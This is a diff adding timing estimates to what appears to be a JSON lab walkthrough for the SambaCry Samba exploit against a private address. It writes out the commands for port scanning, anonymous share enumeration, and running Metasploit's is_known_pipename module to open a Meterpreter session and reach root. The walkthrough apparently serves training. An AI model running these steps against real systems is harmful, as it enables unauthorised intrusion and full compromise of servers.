@@ -12,24 +12,28 @@
       "title": "Verify SMB is running",
       "command": "nmap -sV -p 139,445 172.20.0.16",
       "explanation": "Scan for SMB/Samba ports. Port 445 is SMB over TCP.",
-      "expected": "445/tcp open  netbios-ssn Samba"
+      "expected": "445/tcp open  netbios-ssn Samba",
+      "duration": "5-10 sec"
     },
     {
       "title": "Enumerate Samba shares",
       "command": "smbclient -L //172.20.0.16 -N",
       "explanation": "List available shares without authentication (-N = no password). Look for writable shares.",
-      "expected": "Sharename list with 'data' or similar writable share"
+      "expected": "Sharename list with 'data' or similar writable share",
+      "duration": "2-5 sec"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "Launch Metasploit Framework."
+      "explanation": "Launch Metasploit Framework.",
+      "duration": "5-15 sec"
     },
     {
       "title": "Search for SambaCry",
       "command": "search is_known_pipename",
       "explanation": "Find the SambaCry exploit module.",
-      "expected": "exploit/linux/samba/is_known_pipename"
+      "expected": "exploit/linux/samba/is_known_pipename",
+      "duration": "1-2 sec"
     },
     {
       "title": "Use the exploit",
@@ -60,7 +64,8 @@
       "title": "Run the exploit",
       "command": "run",
       "explanation": "Upload and execute the payload.",
-      "expected": "Meterpreter session opened"
+      "expected": "Meterpreter session opened",
+      "duration": "5-15 sec"
     },
     {
       "title": "Verify root access",
